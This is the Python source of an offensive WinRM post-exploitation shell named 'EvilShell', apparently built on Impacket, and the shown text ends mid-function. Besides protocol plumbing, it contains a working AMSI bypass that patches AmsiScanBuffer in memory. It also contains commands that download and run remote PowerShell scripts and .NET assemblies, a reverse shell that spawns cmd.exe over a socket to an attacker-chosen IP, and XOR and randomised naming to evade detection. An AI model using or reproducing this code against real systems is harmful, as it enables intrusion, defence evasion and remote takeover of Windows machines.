#!/usr/bin/env -S uv run --script
# Impacket-based WinRM shell with PowerShell execution capabilities
# This is a standalone implementation combining both modules

import sys
import os
import re
import logging
import time
import shlex
import ssl
import socket
import struct
from signal import SIGINT, signal, getsignal
from pathlib import PureWindowsPath, Path
from argparse import ArgumentParser, RawTextHelpFormatter
from ipaddress import ip_address, IPv4Address
from base64 import b64encode, b64decode
from random import randbytes, randint
from threading import Thread, Event
from queue import Queue, Empty
from datetime import datetime

# Try to import Impacket
try:
    from impacket import version
    from impacket.examples import logger
    from impacket.examples.utils import parse_target
    from impacket.dcerpc.v5.rpcrt import TypeSerialization1
    from impacket.ntlm import getNTLMSSPType1, getNTLMSSPType3
    from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
    IMPACKET_AVAILABLE = True
except ImportError:
    IMPACKET_AVAILABLE = False
    print("[!] Impacket not found. Some features may be limited.")
    print("[!] Install with: pip install impacket")

# Cryptography
try:
    from Cryptodome.Hash import MD5
    from Cryptodome.Cipher import AES
    from Cryptodome.Util.Padding import pad, unpad
    CRYPTO_AVAILABLE = True
except ImportError:
    try:
        from Crypto.Hash import MD5
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad, unpad
        CRYPTO_AVAILABLE = True
    except ImportError:
        CRYPTO_AVAILABLE = False
        print("[!] PyCryptodome not found. Install with: pip install pycryptodome")

# Try prompt_toolkit for enhanced CLI
try:
    from prompt_toolkit import prompt, ANSI
    from prompt_toolkit.history import FileHistory
    from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
    prompt_toolkit_available = sys.stdout.isatty()
except ImportError:
    prompt_toolkit_available = False
    print("[!] prompt_toolkit not available. Basic input will be used.")

# -------------------------------------------------------------------------
# WinRM Protocol Constants and Classes
# -------------------------------------------------------------------------

WINRM_NS = "http://schemas.microsoft.com/wbem/wsman/1/"
SOAP_ENV_NS = "http://www.w3.org/2003/05/soap-envelope"
WSMAN_NS = "http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"

class WinRMException(Exception):
    pass

class WinRMTransport:
    def __init__(self, host, port=5985, ssl=False, timeout=30):
        self.host = host
        self.port = port
        self.use_ssl = ssl
        self.timeout = timeout
        self.socket = None
        self.session_id = None
        self.auth_type = None
        self.headers = {}
        
    def connect(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(self.timeout)
            
            if self.use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                self.socket = context.wrap_socket(
                    self.socket, server_hostname=self.host
                )
            
            self.socket.connect((self.host, self.port))
            return True
        except Exception as e:
            logging.error(f"Connection failed: {e}")
            return False
    
    def disconnect(self):
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
            self.socket = None
    
    def send_request(self, action, body, options=None):
        if not self.socket:
            raise WinRMException("Not connected")
        
        # Build SOAP request
        soap_request = self._build_soap_request(action, body, options)
        
        # Send request
        http_request = self._build_http_request(soap_request, action)
        self.socket.sendall(http_request.encode('utf-8'))
        
        # Receive response
        response = self._receive_response()
        return self._parse_soap_response(response)
    
    def _build_http_request(self, body, action):
        headers = [
            f"POST /wsman HTTP/1.1",
            f"Host: {self.host}:{self.port}",
            "User-Agent: Python WinRM Client",
            f"Content-Type: application/soap+xml;charset=UTF-8",
            f"Content-Length: {len(body)}",
            f"Connection: Keep-Alive"
        ]
        
        if action:
            headers.append(f'SOAPAction: "{action}"')
        
        if self.session_id:
            headers.append(f'Authorization: {self.auth_type} {self.session_id}')
        
        return "\r\n".join(headers) + "\r\n\r\n" + body
    
    def _build_soap_request(self, action, body, options):
        opts = options or {}
        
        # Build resource URI
        resource_uri = opts.get('resource_uri', f'{WINRM_NS}windows/shell/cmd')
        
        # Build SOAP envelope
        soap = f'''<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="{SOAP_ENV_NS}" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" 
               xmlns:wsman="{WINRM_NS}" xmlns:wsen="http://schemas.xmlsoap.org/ws/2004/09/enumeration">
  <soap:Header>
    <wsa:To>http://{self.host}:{self.port}/wsman</wsa:To>
    <wsman:ResourceURI s:mustUnderstand="true">{resource_uri}</wsman:ResourceURI>
    <wsa:ReplyTo>
      <wsa:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</wsa:Address>
    </wsa:ReplyTo>
    <wsa:Action s:mustUnderstand="true">{action}</wsa:Action>
    <wsman:MaxEnvelopeSize s:mustUnderstand="true">153600</wsman:MaxEnvelopeSize>
    <wsa:MessageID>uuid:{self._generate_uuid()}</wsa:MessageID>
    <wsman:Locale xml:lang="en-US" s:mustUnderstand="false"/>
    <wsman:SelectorSet>
      <wsman:Selector Name="ShellId">{{SHELL_ID}}</wsman:Selector>
    </wsman:SelectorSet>
    <wsman:OperationTimeout>PT{self.timeout}S</wsman:OperationTimeout>
  </soap:Header>
  <soap:Body>
    {body}
  </soap:Body>
</soap:Envelope>'''
        
        return soap
    
    def _receive_response(self):
        data = b""
        while True:
            try:
                chunk = self.socket.recv(4096)
                if not chunk:
                    break
                data += chunk
                if b"\r\n\r\n" in data:
                    # Parse headers to get content length
                    header_end = data.find(b"\r\n\r\n")
                    headers = data[:header_end].decode('utf-8', errors='ignore')
                    
                    # Look for Content-Length
                    content_length = 0
                    for line in headers.split('\r\n'):
                        if line.lower().startswith('content-length:'):
                            content_length = int(line.split(':')[1].strip())
                            break
                    
                    if content_length > 0:
                        body_start = header_end + 4
                        if len(data) >= body_start + content_length:
                            break
            except socket.timeout:
                break
            except Exception as e:
                logging.error(f"Receive error: {e}")
                break
        
        return data.decode('utf-8', errors='ignore')
    
    def _parse_soap_response(self, response):
        # Simple XML parsing for WinRM responses
        try:
            # Extract SOAP body
            start = response.find('<s:Body')
            if start == -1:
                start = response.find('<soap:Body')
            
            if start != -1:
                end = response.find('</s:Body>')
                if end == -1:
                    end = response.find('</soap:Body>')
                
                if end != -1:
                    body = response[start:end+10]
                    return body
        except:
            pass
        
        return response
    
    def _generate_uuid(self):
        import uuid
        return str(uuid.uuid4())

class Runspace:
    def __init__(self, transport, timeout=30):
        self.transport = transport
        self.timeout = timeout
        self.shell_id = None
        self.command_id = None
        self.output_queue = Queue()
        self.running = False
        self.interrupt_event = Event()
        
    def __enter__(self):
        self.open()
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        self.close()
    
    def open(self):
        try:
            # Create shell
            body = f'''<Shell xmlns="{WINRM_NS}">
  <InputStreams>stdin</InputStreams>
  <OutputStreams>stdout stderr</OutputStreams>
</Shell>'''
            
            response = self.transport.send_request(
                f'{WINRM_NS}shell/Create',
                body,
                {'resource_uri': f'{WINRM_NS}windows/shell/cmd'}
            )
            
            # Extract ShellId from response
            match = re.search(r'<w:Selector Name="ShellId">([^<]+)</w:Selector>', response)
            if match:
                self.shell_id = match.group(1)
                logging.debug(f"Shell created: {self.shell_id}")
                self.running = True
                return True
            
            return False
        except Exception as e:
            logging.error(f"Failed to create shell: {e}")
            return False
    
    def close(self):
        if self.shell_id and self.running:
            try:
                body = f'<Shell xmlns="{WINRM_NS}"><ShellId>{self.shell_id}</ShellId></Shell>'
                self.transport.send_request(
                    f'{WINRM_NS}shell/Delete',
                    body,
                    {'resource_uri': f'{WINRM_NS}windows/shell/cmd'}
                )
            except:
                pass
        
        self.running = False
        self.shell_id = None
        self.command_id = None
    
    def run_command(self, command):
        if not self.running or not self.shell_id:
            raise WinRMException("Shell not open")
        
        # Create command
        body = f'''<CommandLine xmlns="{WINRM_NS}">
  <Command>powershell.exe</Command>
  <Arguments>-NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand {self._encode_command(command)}</Arguments>
</CommandLine>'''
        
        response = self.transport.send_request(
            f'{WINRM_NS}shell/Command',
            body,
            {'resource_uri': f'{WINRM_NS}windows/shell/cmd'}
        )
        
        # Extract CommandId
        match = re.search(r'<rsp:CommandId>([^<]+)</rsp:CommandId>', response)
        if match:
            self.command_id = match.group(1)
        
        # Start receiving output
        return self._receive_output()
    
    def _encode_command(self, command):
        # Encode PowerShell command as Base64
        encoded = b64encode(command.encode('utf-16-le')).decode('ascii')
        return encoded
    
    def _receive_output(self):
        if not self.command_id:
            return
        
        while True:
            if self.interrupt_event.is_set():
                self.interrupt_event.clear()
                yield {"error": "Command interrupted"}
                break
            
            try:
                body = f'''<Receive xmlns="{WINRM_NS}">
  <DesiredStream CommandId="{self.command_id}">stdout stderr</DesiredStream>
</Receive>'''
                
                response = self.transport.send_request(
                    f'{WINRM_NS}shell/Receive',
                    body,
                    {'resource_uri': f'{WINRM_NS}windows/shell/cmd'}
                )
                
                # Parse output
                output = self._parse_output(response)
                if output:
                    yield output
                
                # Check if command is done
                if '<rsp:State State="Done"' in response:
                    break
                
                time.sleep(0.1)
            except Exception as e:
                yield {"error": str(e)}
                break
    
    def _parse_output(self, response):
        output = {}
        
        # Parse stdout
        stdout_matches = re.findall(r'<rsp:Stream Name="stdout"[^>]*>([^<]+)</rsp:Stream>', response)
        if stdout_matches:
            decoded = b64decode(stdout_matches[0]).decode('utf-8', errors='ignore')
            output["stdout"] = decoded
        
        # Parse stderr
        stderr_matches = re.findall(r'<rsp:Stream Name="stderr"[^>]*>([^<]+)</rsp:Stream>', response)
        if stderr_matches:
            decoded = b64decode(stderr_matches[0]).decode('utf-8', errors='ignore')
            output["error"] = decoded
        
        return output
    
    def interrupt(self):
        self.interrupt_event.set()

# -------------------------------------------------------------------------
# Helper Functions
# -------------------------------------------------------------------------

def chunks(xs, n):
    """Split list into chunks of size n"""
    for off in range(0, len(xs), n):
        yield xs[off:off+n]

def b64str(s):
    """Base64 encode string or bytes"""
    if isinstance(s, str):
        return b64encode(s.encode()).decode()
    else:
        return b64encode(s).decode()

def split_args(cmdline):
    """Split command line arguments (simplified)"""
    try:
        return shlex.split(cmdline, posix=False)
    except:
        return cmdline.split()

def xorenc(xs, key):
    """XOR encrypt/decrypt bytes"""
    return bytes(x ^ key for x in xs)

class CtrlCHandler:
    """Handle Ctrl+C gracefully"""
    def __init__(self, max_interrupts=4, timeout=5):
        self.max_interrupts = max_interrupts
        self.timeout = timeout

    def __enter__(self):
        self.interrupted = 0
        self.released = False
        self.original_handler = getsignal(SIGINT)

        def handler(signum, frame):
            self.interrupted += 1
            if self.interrupted > 1:
                n = self.max_interrupts - self.interrupted + 2
                print()
                print(f"Ctrl+C spammed, {n} more will terminate ungracefully.")
                print(f"Try waiting ~{self.timeout} more seconds for a client to get a "\
                        "chance to send the interrupt")

            if self.interrupted > self.max_interrupts:
                self.release()

        signal(SIGINT, handler)
        return self

    def __exit__(self, type, value, tb):
        self.release()

    def release(self):
        if self.released:
            return False

        signal(SIGINT, self.original_handler)
        self.released = True
        return True

# -------------------------------------------------------------------------
# Main Shell Class
# -------------------------------------------------------------------------

class EvilShell:
    def __init__(self, runspace):
        self.runspace = runspace
        self.cwd = ""
        self.stdout_log = None
        self.need_clear = False
        
        # Dynamic .NET namespace for bypasses
        self._ns = "A" + randbytes(randint(3,8)).hex()
        
        # Host writer for .NET output
        self._host_writer = "H" + randbytes(randint(3,8)).hex()
        self.new_HostWriter = f"(New-Object {self._ns}.{self._host_writer} {{ Write-Host -NoNewLine $args }})"
        self.import_HostWriter = """
Add-Type -TypeDefinition @"
namespace _NS {
public class _HOSTWRITER : System.IO.TextWriter {
  private System.Action<string> _act;
  public _HOSTWRITER(System.Action<string> act) { _act = act; }
  public override void Write(char v) { _act(v.ToString()); }
  public override void Write(string v) { _act(v); }
  public override void WriteLine(string v) { _act(v + System.Environment.NewLine); }
  public override System.Text.Encoding Encoding { get { return System.Text.Encoding.UTF8; } }
}}
"@""".replace("_NS", self._ns).replace("_HOSTWRITER", self._host_writer)
        
        # XOR encryption for files
        self._xor_enc = "X" + randbytes(randint(3,8)).hex()
        self._xor_key = randint(1,255)
        self.call_XorEnc = f"[{self._ns}.{self._xor_enc}]::x"
        self.import_XorEnc = """
Add-Type @"
namespace _NS {
public class _XORENC {
  public static byte[] x(byte[] y) {
    for(int i = 0; i < y.Length; i++) { y[i] ^= _KEY; }
    return y;
  }
}}
"@
""".replace("_NS", self._ns).replace("_KEY", str(self._xor_key)).replace("_XORENC", self._xor_enc)
        
        # Path fix for zipping
        self._path_fix = "P" + randbytes(randint(3,8)).hex()
        self._new_PathFix = f"(New-Object {self._ns}.{self._path_fix})"
        self._importPathFix = """
Add-Type @"
namespace _NS {
public class _PATHFIX : System.Text.UTF8Encoding {
  public override byte[] GetBytes(string s) {
    s=s.Replace("\\\\", "/");
    return base.GetBytes(s);
  }
}}
"@
""".replace("_NS", self._ns).replace("_PATHFIX", self._path_fix)
        
        # DLL imports
        self._setup_dll_imports()
        
        if prompt_toolkit_available:
            try:
                self.prompt_history = FileHistory(".winrmexec_history")
            except:
                self.prompt_history = None

    def _setup_dll_imports(self):
        """Setup DLL import functions"""
        # LoadLibrary
        cls = f"f{randbytes(randint(3,8)).hex()}"
        name = f"g{randbytes(randint(3,8)).hex()}"
        code = f'[DllImport("kernel32",EntryPoint="LoadLibraryA")] public static extern IntPtr {name}(string x);'
        setattr(self, "_call_LoadLibrary", f"[{self._ns}.{cls}]::{name}")
        setattr(self, "_import_LoadLibrary", f"""Add-Type -Name {cls} -Namespace {self._ns} -Member '{code}'""")
        
        # GetProcAddress
        cls = f"f{randbytes(randint(3,8)).hex()}"
        name = f"g{randbytes(randint(3,8)).hex()}"
        code = f'[DllImport("kernel32",EntryPoint="GetProcAddress")] public static extern IntPtr {name}(IntPtr x, string y);'
        setattr(self, "_call_GetProcAddress", f"[{self._ns}.{cls}]::{name}")
        setattr(self, "_import_GetProcAddress", f"""Add-Type -Name {cls} -Namespace {self._ns} -Member '{code}'""")
        
        # VirtualProtect
        cls = f"f{randbytes(randint(3,8)).hex()}"
        name = f"g{randbytes(randint(3,8)).hex()}"
        code = f'[DllImport("kernel32",EntryPoint="VirtualProtect")] public static extern bool {name}(IntPtr x, IntPtr y, uint z, out uint w);'
        setattr(self, "_call_VirtualProtect", f"[{self._ns}.{cls}]::{name}")
        setattr(self, "_import_VirtualProtect", f"""Add-Type -Name {cls} -Namespace {self._ns} -Member '{code}'""")
        
        # WSAStartup
        cls = f"f{randbytes(randint(3,8)).hex()}"
        name = f"g{randbytes(randint(3,8)).hex()}"
        code = f'[DllImport("ws2_32",EntryPoint="WSAStartup")] public static extern int {name}(short x, byte[] y);'
        setattr(self, "_call_WSAStartup", f"[{self._ns}.{cls}]::{name}")
        setattr(self, "_import_WSAStartup", f"""Add-Type -Name {cls} -Namespace {self._ns} -Member '{code}'""")
        
        # WSASocket
        cls = f"f{randbytes(randint(3,8)).hex()}"
        name = f"g{randbytes(randint(3,8)).hex()}"
        code = f'[DllImport("ws2_32",EntryPoint="WSASocketA")] public static extern IntPtr {name}(int x, int y, int z, int w, IntPtr a, uint b, uint c);'
        setattr(self, "_call_WSASocket", f"[{self._ns}.{cls}]::{name}")
        setattr(self, "_import_WSASocket", f"""Add-Type -Name {cls} -Namespace {self._ns} -Member '{code}'""")
        
        # WSAConnect
        cls = f"f{randbytes(randint(3,8)).hex()}"
        name = f"g{randbytes(randint(3,8)).hex()}"
        code = f'[DllImport("ws2_32",EntryPoint="WSAConnect")] public static extern int {name}(IntPtr x, byte[] y, int z, IntPtr a, IntPtr b, IntPtr c, IntPtr d);'
        setattr(self, "_call_WSAConnect", f"[{self._ns}.{cls}]::{name}")
        setattr(self, "_import_WSAConnect", f"""Add-Type -Name {cls} -Namespace {self._ns} -Member '{code}'""")
        
        # CreateProcess
        cls = f"f{randbytes(randint(3,8)).hex()}"
        name = f"g{randbytes(randint(3,8)).hex()}"
        code = f'[DllImport("kernel32",EntryPoint="CreateProcessA")] public static extern bool {name}(string x, string y, IntPtr z, IntPtr a, bool b, uint c, IntPtr d, string e, long[] f, byte[] g);'
        setattr(self, "_call_CreateProcess", f"[{self._ns}.{cls}]::{name}")
        setattr(self, "_import_CreateProcess", f"""Add-Type -Name {cls} -Namespace {self._ns} -Member '{code}'""")

    def __del__(self):
        self.stop_log()

    def start_log(self):
        if not self.stdout_log:
            logfile = f"winrmexec_{int(time.time())}_stdout.log"
            self.write_info(f"logging output to {logfile}")
            self.stdout_log = open(logfile, "wb")

    def stop_log(self):
        if self.stdout_log:
            self.stdout_log.close()
            self.stdout_log = None

    def help(self):
        print()
        print("Ctrl+D to exit, Ctrl+C will try to interrupt the running pipeline gracefully")
        print("\x1b[1m\x1b[31mThis is not an interactive shell!\x1b[0m If you need to run programs that expect")
        print("inputs from stdin, or exploits that spawn cmd.exe, etc., pop a !revshell")
        print()
        print("Special !bangs:")
        print("  !download RPATH [LPATH]          # downloads a file or directory (as a zip file); use 'PATH'")
        print("                                   # if it contains whitespace")
        print()
        print("  !upload [-xor] LPATH [RPATH]     # uploads a file; use 'PATH' if it contains whitespace, though use iwr")
        print("                                   # if you can reach your ip from the box, because this can be slow;")
        print("                                   # use -xor only in conjunction with !psrun/!netrun")
        print()
        print("  !amsi                            # amsi bypass, run this right after you get a prompt")
        print()
        print("  !psrun [-xor] URL                # run .ps1 script from url; uses ScriptBlock smuggling, so no !amsi patching is")
        print("                                   # needed unless that script tries to load a .NET assembly; if you can't reach")
        print("                                   # your ip, !upload with -xor first, then !psrun -xor 'c:\\foo\\bar.ps1' (needs absolute path)")
        print()
        print("  !netrun [-xor] URL [ARG] [ARG]   # run .NET assembly from url, use 'ARG' if it contains whitespace;")
        print("                                   # !amsi first if you're getting '...program with an incorrect format' errors;")
        print("                                   # if you can't reach your ip, !upload with -xor first then !netrun -xor 'c:\\foo\\bar.exe' (needs absolute path)")
        print()
        print("  !revshell IP PORT                # pop a revshell at IP:PORT with stdin/out/err redirected through a socket; if you can't reach your ip and you")
        print("                                   # you need to run an executable that expects input, try:")
        print("                                   # PS> Set-Content -Encoding ASCII 'stdin.txt' \"line1`nline2`nline3\"")
        print("                                   # PS> Start-Process some.exe -RedirectStandardInput 'stdin.txt' -RedirectStandardOutput 'stdout.txt'")
        print()
        print("  !log                             # start logging output to winrmexec_[timestamp]_stdout.log")
        print("  !stoplog                         # stop logging output to winrmexec_[timestamp]_stdout.log")
        print()

    def repl(self, inputs=None):
        self.update_cwd()
        for cmd in map(str.strip, inputs or self.read_line()):
            if not cmd:
                continue
            elif cmd in { "exit", "quit", "!exit", "!quit" }:
                return
            elif cmd.startswith("!download "):
                self.download(cmd.removeprefix("!download "))
            elif cmd.startswith("!upload "):
                self.upload(cmd.removeprefix("!upload "))
            elif cmd.startswith("!amsi"):
                self.amsi_bypass()
            elif cmd.startswith("!netrun "):
               self.netrun(cmd.removeprefix("!netrun "))
            elif cmd.startswith("!psrun "):
               self.psrun(cmd.removeprefix("!psrun "))
            elif cmd.startswith("!revshell "):
                self.revshell(cmd.removeprefix("!revshell "))
            elif cmd.startswith("!log"):
                self.start_log()
            elif cmd.startswith("!stoplog"):
                self.stop_log()
            elif cmd.startswith("!") or cmd in { "help", "?" }:
                self.help()
            else:
                if self.stdout_log:
                    self.stdout_log.write(f"PS {self.cwd}> {cmd}\n".encode())
                    self.stdout_log.flush()
                self.run_with_interrupt(cmd, self.write_line)
                self.update_cwd()

    def update_cwd(self):
        result = self.run_sync("(Get-Location).Path")
        self.cwd = result.strip() if result else "C:\\"

    def read_line(self):
        while True:
            try:
                pre = f"\x1b[1m\x1b[33mPS\x1b[0m {self.cwd}> "
                if prompt_toolkit_available and hasattr(self, 'prompt_history'):
                    cmd = prompt(ANSI(pre), history=self.prompt_history)
                else:
                    cmd = input(pre)
            except KeyboardInterrupt:
                continue
            except EOFError:
                return
            else:
                yield cmd

    def write_warning(self, msg):
        self.write_line({ "warn" : msg })

    def write_info(self, msg):
        self.write_line({ "info" : msg, "endl" : "\n" })

    def write_error(self, msg):
        self.write_line({ "error" : msg })

    def write_progress(self, msg):
        self.write_line({ "progress" : msg })

    def write_line(self, out):
        clear = "\033[2K\r" if self.need_clear else ""
        self.need_clear = False
        log_msg = b""

        if "stdout" in out:
            print(clear + out["stdout"], flush=True, end="")
            log_msg = out["stdout"].encode()

        elif "info" in out:
            print(clear + out["info"], end=out.get("endl", ""), flush=True)
            log_msg = out["info"].encode() + out.get("endl", "").encode()

        elif "error" in out:
            print(clear + "\x1b[31m" + out["error"] + "\x1b[0m", flush=True)
            log_msg = out["error"].encode()

        elif "warn" in out:
            print(clear + "\x1b[33m" + out["warn"] + "\x1b[0m", flush=True)
            log_msg = out["warn"].encode()

        elif "verbose" in out:
            print(clear + out["verbose"], flush=True)
            log_msg = out["verbose"].encode()

        elif "progress" in out:
            print(clear + "\x1b[34m" + out["progress"] + "\x1b[0m", end="\r", flush=True)
            self.need_clear = True

        if self.stdout_log and log_msg:
            self.stdout_log.write(log_msg)
            self.stdout_log.flush()

    def run_sync(self, cmd):
        output = []
        for out in self.runspace.run_command(cmd):
            if "stdout" in out:
                output.append(out["stdout"])
        return "".join(output)

    def run_with_interrupt(self, cmd, output_handler=None, exception_handler=None):
        output_stream = self.runspace.run_command(cmd)
        while True:
            with CtrlCHandler(timeout=5) as h:
                try:
                    out = next(output_stream)
                except StopIteration:
                    break
                except Exception as e:
                    if exception_handler and exception_handler(e):
                        continue
                    else:
                        raise e

                if output_handler:
                    output_handler(out)

                if h.interrupted:
                    self.runspace.interrupt()

        return h.interrupted > 0

    def str_b64(self, arg):
        return f"([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{b64str(arg)}')))"

    def psrun(self, cmdline):
        args = split_args(cmdline)[:2]

        url = args[-1]
        xorfunc = ""
        if args[0].lower() == "-xor":
            if len(args) != 2:
                self.write_warning("missing URL")
                return

            if args[-1].lower().startswith("http"):
                self.write_warning("use -xor only for files that were uploaded with !upload -xor")
                return

            xorfunc = self.call_XorEnc

        commands = [
            self.import_XorEnc,
            f'$c = (New-Object Net.WebClient).DownloadData({self.str_b64(url)})',
            f'$c = [ScriptBlock]::Create([Text.Encoding]::UTF8.GetString(({xorfunc}($c))))',
             "$c = $c.Ast.EndBlock.Copy()",
             "$a = [ScriptBlock]::Create('Get-ChildItem').Ast",
             "$b = [Management.Automation.Language.ScriptBlockAst]::new($a.Extent,$null,$null,$null,$c,$null)",
             "Invoke-Command -NoNewScope -ScriptBlock $b.GetScriptBlock()",
             "Remove-Variable @('a','b','c')"
        ]

        for cmd in commands:
            logging.debug(cmd)
            self.run_with_interrupt(cmd, self.write_line)

    def netrun(self, cmdline):
        args = split_args(cmdline)
        if args[0].lower() == "-xor":
            if len(args) == 1:
                self.write_warning("missing URL and [ARGS..]")
                return
            xorfunc = self.call_XorEnc
            args = args[1:]
        else:
            xorfunc = ""

        args = [ self.str_b64(arg) for arg in args ]

        url = args[0]
        argv = "[string[]]@(" + ",".join(args[1:]) + ")"

        commands = [
            self.import_HostWriter, self.import_XorEnc,
            f"$buf = (New-Object Net.WebClient).DownloadData({url})",
            f"$dll = [Reflection.Assembly]::Load({xorfunc}($buf))",
            f"$out = {self.new_HostWriter}",
            f"[Console]::SetOut($out); [Console]::SetError($out)",
            f"$dll.EntryPoint.Invoke($null,(,{argv}))",
            f"[Console]::SetOut([IO.StreamWriter]::Null)",
            f"[Console]::SetError([IO.StreamWriter]::Null)",
            f"$out.Dispose()",
            f"Remove-Variable @('buf','dll','out')"
        ]

        for cmd in commands:
            logging.debug(cmd)
            self.run_with_interrupt(cmd, self.write_line)

    def amsi_bypass(self):
        commands = [
            self._import_LoadLibrary,
            self._import_GetProcAddress,
            self._import_VirtualProtect,
            f"$addr = {self._call_GetProcAddress}({self._call_LoadLibrary}({self.str_b64('amsi.dll')}), {self.str_b64('AmsiScanBuffer')})",
            f"{self._call_VirtualProtect}($addr, [IntPtr]6, 64, [ref]$null)",
            f"Start-Sleep -Seconds 1",
            f"[Runtime.InteropServices.Marshal]::Copy([byte[]](0xb8,0x57,0,7,0x80,0xc3), 0, $addr, 6)",
            f"Start-Sleep -Seconds 1",
            f"{self._call_VirtualProtect}($addr, [IntPtr]6, 32, [ref]$null)",
        ]
        for cmd in commands:
            logging.debug(cmd)
            self.run_with_interrupt(cmd, self.write_line)

    def revshell(self, cmdline):
        args = split_args(cmdline)
        try:
            ip = ip_address(args[0])
            port = int(args[1])
            ip_bytes = ip.packed if isinstance(ip, IPv4Address) else ip.packed[:4]
            p_hi, p_lo = (port >> 8) & 0xff, port & 0xff
        except:
            self.write_error("Invalid IP or port")
            return

        commands = [
            self._import_WSAStartup, self._import_WSASocket, self._import_WSAConnect, self._import_CreateProcess,
            f"{self._call_WSAStartup}(0x202,(New-Object byte[] 64))",
            f"$sock = {self._call_WSASocket}(2,1,6,0,0,0)",
            f"{self._call_WSAConnect}($sock,[byte[]](2,0,{p_hi},{p_lo},{ip_bytes[0]},{ip_bytes[1]},{ip_bytes[2]},{ip_bytes[3]},0,0,0,0,0,0,0,0),16,0,0,0,0)",
            f"$sinfo = [int64[]](104,0,0,0,0,0,0,0x10100000000,0,0,$sock,$sock,$sock)",
            f"{self._call_CreateProcess}(0,'cmd.exe',0,0,1,0,0,0,$sinfo,(New-Object byte[] 32))",
            f"Remove-Variable @('sock','sinfo')"
        ]

        for cmd in commands:
            logging.debug(cmd)
            self.run_with_interrupt(cmd, self.write_line)

    def upload(self, cmdline):
        args = split_args(cmdline)

        if args[0].lower() == "-xor":
            unxor = False
            args = args[1:]
        else:
            unxor = True

        src = Path(args[0])
        dst = PureWindowsPath(args[1] if len(args) == 2 else src.name)
        try:
            with open(src, "rb") as f:
                buf = f.read()
        except IOError as e:
            self.write_error(str(e))
            return

        tmpfn = self.run_sync("[IO.Path]::GetTempPath()").strip()
        tmpfn = tmpfn + randbytes(8).hex() + ".tmp"
        total = 0
        self.write_info(f"uploading to {tmpfn}")

        self.run_sync(self.import_XorEnc)
        for chunk in chunks(buf, 65536):
            total += len(chunk)
            chunk_b64 = b64str(xorenc(chunk, self._xor_key))
            xorfunc = self.call_XorEnc if unxor else ""
            cmd = f"Add-Content -Encoding Byte '{tmpfn}' ([byte[]]$({xorfunc}([Convert]::FromBase64String('{chunk_b64}'))))"

            interrupted = self.run_with_interrupt(cmd)
            if interrupted:
                self.write_warning("upload interrupted")
                self.run_sync(f"Remove-Item -Force '{tmpfn}'")
                return

            self.write_progress(f"progress: {total}/{len(buf)}")

        self.write_info(f"moving from {tmpfn} to {dst}")
        ps = f"Move-Item -Force -Path '{tmpfn}' -Destination '{dst}'"
        self.run_with_interrupt(ps, self.write_line)

        ps = f"(Get-FileHash '{dst}' -Algorithm MD5).Hash"
        out = self.run_sync(ps)
        md5sum = MD5.new(buf if unxor else xorenc(buf, self._xor_key))
        if out.strip() != md5sum.hexdigest().upper():
            self.write_error("Corrupted upload")

    def download(self, cmdline):
        args = split_args(cmdline)
        if len(args) == 0 or len(args) > 2:
            self.write_warning("usage: !download RPATH [LPATH]")
            return

        src = self.run_sync(f"Resolve-Path -LiteralPath '{args[0]}' | Select -Expand Path")
        if not src:
            self.write_warning(f"{args[0]} not found")
            return

        src = PureWindowsPath(src.strip())

        dst = Path(args[1]) if len(args) == 2 else Path(src.name)
        if dst.is_dir():
            dst = dst.joinpath(src.name)

        if not dst.parent.exists():
            os.makedirs(dst.parent, exist_ok=True)

        src_is_dir = self.run_sync(f"Test-Path -Path '{src}' -PathType Container").strip() == "True"
        if src_is_dir:
            if not dst.name.lower().endswith(".zip"):
                dst = Path(dst.parent).joinpath(f"{dst.name}.zip")
            self.write_info(f"{src} is a directory, will download a zip file of its contents to {dst}")

            tmpdir = self.run_sync("[System.IO.Path]::GetTempPath()").strip()
            tmpnm = randbytes(8).hex()
            tmpfn = tmpdir + tmpnm
            ps = f"""
                Add-Type -AssemblyName "System.IO.Compression.FileSystem"
                New-Item -Path '{tmpdir}' -ItemType Directory -Name '{tmpnm}' | Out-Null
                Get-ChildItem -Force -Recurse -Path '{src}' | ForEach-Object {{
                    if(-not ($_.FullName -Like "*{tmpnm}*")) {{
                        try {{
                            $dst = $_.FullName.Replace('{src}', '')
                            Copy-Item -ErrorAction SilentlyContinue -Force $_.FullName "{tmpfn}\\$dst"
                        }} catch {{
                            Write-Warning "skipping $dst"
                        }}
                    }}
                }}
                {self._importPathFix}
                [IO.Compression.ZipFile]::CreateFromDirectory('{tmpfn}', '{tmpfn}.zip', [IO.Compression.CompressionLevel]::Fastest, $true, ${self._new_PathFix})
                Remove-Item -Recurse -Force -Path '{tmpfn}'
            """

            self.run_with_interrupt(ps, self.write_line)
            src = tmpfn + ".zip"

        ps = f"""function Download-Remote {{
            $h = Get-FileHash '{src}' -Algorithm MD5 | Select -Expand Hash;
            $f = [System.IO.File]::OpenRead('{src}');
            $b = New-Object byte[] 65536;
            while(($n = $f.Read($b, 0, 65536)) -gt 0) {{ [Convert]::ToBase64String($b, 0, $n) }};
            $f.Close();
            [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($h));
            }}
            Download-Remote
            Remove-Item Function:Download-Remote
        """

        self.write_info(f"downloading {src}")
        
        buf = bytearray()
        for out in self.runspace.run_command(ps):
            if "stdout" in out:
                chunk = out["stdout"].strip()
                if chunk:
                    try:
                        decoded = b64decode(chunk)
                        if len(decoded) == 32:  # MD5 hash
                            continue
                        buf.extend(decoded)
                        self.write_progress(f"progress: {len(buf)} bytes")
                    except:
                        pass

        if src_is_dir:
            self.run_sync(f"Remove-Item -fo '{src}'")

        if len(buf) >= 32:
            received_hash = buf[-32:].decode('ascii', errors='ignore')
            data = buf[:-32]
            calculated_hash = MD5.new(data).hexdigest().upper()
            
            if received_hash != calculated_hash:
                self.write_error("Corrupted download or file access error")
                return

        self.write_info(f"done, writing to {dst.resolve()}")
        try:
